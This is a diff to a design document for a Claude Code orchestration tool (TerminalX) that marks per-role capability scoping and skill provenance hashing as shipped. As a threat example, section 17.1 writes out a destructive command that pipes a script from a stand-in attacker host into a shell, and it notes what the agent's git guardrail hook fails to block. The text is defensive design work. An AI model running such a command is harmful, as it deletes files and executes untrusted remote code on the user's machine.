@@ -619,7 +619,7 @@ A single-PR ship is too big. Three slices, each independently mergeable and usef
 
 This section folds in items promoted from the 2026-05-04 addendum after review on the same date. They are not "platform polish"; they are the floor for the v1 production claim. Each subsection cross-references the addendum where the design rationale lives in fuller form.
 
-### 17.1 Per-role capability scoping (from addendum A2)
+### 17.1 Per-role capability scoping (from addendum A2) — *shipped 2c-ii.4*
 
 The `git-guardrails-claude-code` PreToolUse hook (§12.2) blocks specific destructive git verbs. It does *not* constrain file-write paths, network egress, arbitrary subprocess spawning, or MCP tool selection. A misbehaving Builder can still `rm -rf node_modules && curl evil.com | sh` — guardrails catch `git push` and nothing else. Defence-in-depth requires per-role allowlists.
 
@@ -737,7 +737,7 @@ Two mechanisms:
 
 `secretsMask()` is a pure Rust function in `commands/secrets.rs`, unit-tested with positive and negative fixtures (false-positive guard: package-lock SHAs and git SHAs must NOT be masked; mask only when in env-shaped contexts).
 
-### 17.7 Bundled-skill provenance signing (new — flagged in 2026-05-04 review)
+### 17.7 Bundled-skill provenance signing (new — flagged in 2026-05-04 review) — *shipped 2c-ii.5 (adapted: SHA-256 hash, not signature)*
 
 §10.3 ships skills bundled with TerminalX, auto-installed to `~/.claude/skills/`. Without signing, a future TerminalX update changing a skill is indistinguishable to the user from a malicious local edit — the user has no way to verify "this skill is from TerminalX vs has been tampered with."
 
